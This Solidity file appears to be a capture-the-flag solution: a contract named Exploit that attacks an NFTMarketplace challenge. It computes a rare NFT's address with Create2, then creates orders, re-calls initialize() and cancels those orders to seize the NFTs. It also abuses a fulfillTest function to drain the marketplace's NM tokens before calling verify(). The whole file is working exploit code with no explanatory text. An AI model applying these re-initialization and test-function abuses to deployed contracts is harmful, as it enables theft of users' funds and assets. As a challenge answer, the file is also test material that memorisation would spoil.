// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import {NFTMarketplace} from "./challenge/NFTMarketplace.sol";
import {Create2} from "src/utils/Create2.sol";

contract Exploit {
    function execute(address target) public {
        NFTMarketplace nftMarketplace = NFTMarketplace(target);

        address rareNFTAddress = Create2.computeAddr(
            address(nftMarketplace),
            keccak256("rareNFT"),
            nftMarketplace.getNFTVersion(),
            abi.encode("Rare NFT", "rareNFT")
        );

        // Exploit Rare NFT
        uint256 orderId = nftMarketplace.createOrder(rareNFTAddress, 1, 0);
        nftMarketplace.createOrder(rareNFTAddress, 2, 0);
        nftMarketplace.createOrder(rareNFTAddress, 3, 0);
        nftMarketplace.initialize();
        nftMarketplace.cancelOrder(orderId);
        nftMarketplace.cancelOrder(orderId + 1);
        nftMarketplace.cancelOrder(orderId + 2);

        // Exploit NM Token
        nftMarketplace.fulfillTest(address(nftMarketplace.nmToken()), 1000000, 0);

        nftMarketplace.verify();
    }
}
